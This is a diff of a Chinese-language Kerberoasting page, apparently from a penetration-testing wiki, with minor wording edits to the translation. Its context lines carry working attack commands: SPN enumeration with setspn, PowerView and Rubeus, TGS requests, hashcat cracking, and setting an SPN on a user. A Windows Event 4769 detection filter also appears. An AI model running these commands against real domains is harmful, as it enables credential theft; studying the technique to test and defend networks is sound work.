@@ -6,7 +6,7 @@
 
 Kerberoasting 侧重于获取 **TGS tickets**，特别是与 **Active Directory (AD)** 中 **用户账户** 相关的服务，排除 **计算机账户**。这些票证的加密使用源自 **用户密码** 的密钥，从而允许 **离线凭证破解** 的可能性。使用用户账户作为服务的标志是 **"ServicePrincipalName"** 属性非空。
 
-执行 **Kerberoasting** 需要一个能够请求 **TGS tickets** 的域账户；然而，这个过程并不需要 **特殊权限**，使得任何拥有 **有效域凭证** 的人都可以访问。
+要执行 **Kerberoasting**，需要一个能够请求 **TGS tickets** 的域账户；然而，这个过程并不需要 **特殊权限**，使得任何拥有 **有效域凭证** 的人都可以访问。
 
 ### 关键点：
 
@@ -19,7 +19,7 @@ Kerberoasting 侧重于获取 **TGS tickets**，特别是与 **Active Directory 
 
 > [!WARNING]
 > **Kerberoasting 工具** 通常在执行攻击和发起 TGS-REQ 请求时请求 **`RC4 encryption`**。这是因为 **RC4 是** [**较弱的**](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795)，并且比其他加密算法如 AES-128 和 AES-256 更容易使用工具如 Hashcat 进行离线破解。\
-> RC4 (类型 23) 哈希以 **`$krb5tgs$23$*`** 开头，而 AES-256 (类型 18) 以 **`$krb5tgs$18$*`** 开头。
+> RC4 (类型 23) 哈希以 **`$krb5tgs$23$*`** 开头，而 AES-256 (类型 18) 以 **`$krb5tgs$18$*`** 开头。`
 ```bash
 # Metasploit framework
 msf> use auxiliary/gather/get_user_spns
@@ -37,14 +37,14 @@ adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
 ```
 #### Windows
 
-- **枚举可进行 Kerberoast 的用户**
+- **枚举可Kerberoast的用户**
 ```powershell
 # Get Kerberoastable users
 setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
 Get-NetUser -SPN | select serviceprincipalname #Powerview
 .\Rubeus.exe kerberoast /stats
 ```
-- **技术 1：请求 TGS 并从内存中转储**
+- **技术 1：请求 TGS 并从内存中转储它**
 ```powershell
 #Get TGS in memory from a single user
 Add-Type -AssemblyName System.IdentityModel
@@ -95,7 +95,7 @@ hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
 ```bash
 Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
 ```
-您可以在此处找到用于 **kerberoast** 攻击的有用 **tools**: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
+您可以在这里找到用于 **kerberoast** 攻击的有用 **tools**: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)
 
 如果您在 Linux 中发现此 **error**: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`**，这可能是由于您的本地时间，您需要将主机与 DC 同步。有几个选项：
 
@@ -104,12 +104,12 @@ Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whatever
 
 ### Mitigation
 
-如果可利用，Kerberoasting 可以以高度隐蔽的方式进行。为了检测此活动，应关注 **Security Event ID 4769**，该事件表明已请求 Kerberos 票证。然而，由于此事件的高频率，必须应用特定过滤器以隔离可疑活动：
+如果可利用，Kerberoasting 可以以高度隐蔽的方式进行。为了检测此活动，应关注 **Security Event ID 4769**，该事件表示请求了 Kerberos 票证。然而，由于此事件的高频率，必须应用特定过滤器以隔离可疑活动：
 
 - 服务名称不应为 **krbtgt**，因为这是正常请求。
 - 以 **$** 结尾的服务名称应被排除，以避免包括用于服务的机器帐户。
 - 应通过排除格式为 **machine@domain** 的帐户名称来过滤来自机器的请求。
-- 仅应考虑成功的票证请求，通过失败代码 **'0x0'** 进行识别。
+- 仅应考虑成功的票证请求，通过失败代码 **'0x0'** 识别。
 - **最重要的是**，票证加密类型应为 **0x17**，这通常用于 Kerberoasting 攻击。
 ```bash
 Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
@@ -123,12 +123,12 @@ Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{
 
 ## Kerberoast w/o domain account
 
-在 **2022 年 9 月**，一位名为 Charlie Clark 的研究人员揭示了一种新的系统利用方式，通过他的平台 [exploit.ph](https://exploit.ph/) 分享。这种方法允许通过 **KRB_AS_REQ** 请求获取 **服务票据 (ST)**，而令人惊讶的是，这并不需要控制任何 Active Directory 账户。基本上，如果一个主体设置为不需要预身份验证——这种情况类似于网络安全领域所称的 **AS-REP Roasting 攻击**——则可以利用这一特性来操纵请求过程。具体来说，通过更改请求主体中的 **sname** 属性，系统被欺骗发出 **ST** 而不是标准的加密票据授予票据 (TGT)。
+在 **2022 年 9 月**，一位名为 Charlie Clark 的研究人员揭示了一种新的系统利用方式，通过他的平台 [exploit.ph](https://exploit.ph/) 分享。这种方法允许通过 **KRB_AS_REQ** 请求获取 **服务票据 (ST)**，而令人惊讶的是，这并不需要对任何 Active Directory 账户的控制。基本上，如果一个主体设置为不需要预身份验证——这种情况类似于网络安全领域所称的 **AS-REP Roasting 攻击**——则可以利用这一特性来操纵请求过程。具体来说，通过更改请求主体中的 **sname** 属性，系统被欺骗发出 **ST** 而不是标准的加密票据授予票据 (TGT)。
 
 该技术在这篇文章中有详细解释：[Semperis 博客文章](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/)。
 
 > [!WARNING]
-> 您必须提供用户列表，因为我们没有有效的账户来使用此技术查询 LDAP。
+> 你必须提供用户列表，因为我们没有有效的账户来使用此技术查询 LDAP。
 
 #### Linux
 
